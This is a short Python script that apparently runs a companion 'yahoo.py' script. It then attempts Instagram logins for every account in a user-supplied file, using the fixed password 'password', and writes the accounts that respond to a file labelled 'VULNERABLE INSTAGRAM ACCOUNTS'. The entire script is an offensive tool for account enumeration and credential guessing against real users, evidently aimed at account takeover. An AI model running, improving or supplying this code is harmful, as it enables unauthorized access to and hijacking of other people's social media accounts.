#All Rights Reserved to Ezzat
from os import system
import random
system('python2 yahoo.py')
file_name = input('Enter the File Name you got recently : ')
from InstagramAPIc.InstagramAPI import InstagramAPI
#True Exists - False Doesn't Exist
print('\nChecking...')
class InstaCheck:
    def __init__(self,acc_list):
        self.exist_list = []
        self.notExist_list = []
        for i in acc_list:
            API = InstagramAPI(i, "password")
            resp = API.login()
            if resp == True:
                self.exist_list.append(i)

            else:
                self.notExist_list.append(i)

check_list = []
x = open(file_name,'r')
for i in x.readlines():
    check_list.append(i.replace('\n',''))
c = InstaCheck(check_list)
rand = random.randint(1000,9999)
vul = open('insta'+str(rand),'w')
print('=============================')
print('VULNERABLE INSTAGRAM ACCOUNTS')
print('=============================\n\n')
for i in c.exist_list:
    print("\033[32m"+i)
    vul.write(str(i)+'\n')
print('Insta List name  > '+'insta'+str(rand)+'.txt')
